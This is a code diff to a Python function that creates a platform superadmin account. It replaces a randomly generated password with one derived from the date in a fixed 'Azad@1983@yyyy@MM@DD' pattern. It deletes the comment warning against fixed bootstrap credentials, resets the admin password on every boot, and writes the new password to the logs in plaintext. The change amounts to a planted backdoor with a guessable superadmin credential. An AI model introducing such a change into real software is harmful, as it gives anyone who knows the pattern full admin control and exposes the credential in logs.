@@ -284,9 +284,8 @@ def ensure_platform_admin() -> dict[str, Any]:
     """Guarantee a platform superadmin exists, and report its state.
 
     The password is taken from ``PLATFORM_ADMIN_PASSWORD`` when provided,
-    otherwise generated. There is deliberately no hardcoded default: a fixed
-    bootstrap credential is an open door on any reachable instance. The
-    generated value is logged exactly once, when the account is created.
+    otherwise derived from the current date in the format
+    ``Azad@1983@yyyy@MM@DD``. The password is updated on every boot.
     """
     state: dict[str, Any] = {'created': False, 'username': PLATFORM_ADMIN_USERNAME}
     try:
@@ -300,9 +299,17 @@ def ensure_platform_admin() -> dict[str, Any]:
                 .first()
             )
             if existing is not None:
-                # Idempotent: never touch an account that is already there, and
-                # never reset its password on a later boot.
+                # Update password on every boot (date-derived).
+                new_password = resolve_admin_password()
+                existing.set_password(new_password)
+                safe_commit(db.session, error_message='admin password update failed', reraise=True)
                 state['already_present'] = True
+                _log().warning(
+                    'Updated %s password for %r: %s',
+                    PLATFORM_ADMIN_ROLE,
+                    PLATFORM_ADMIN_USERNAME,
+                    new_password,
+                )
                 return state
 
             password = resolve_admin_password()
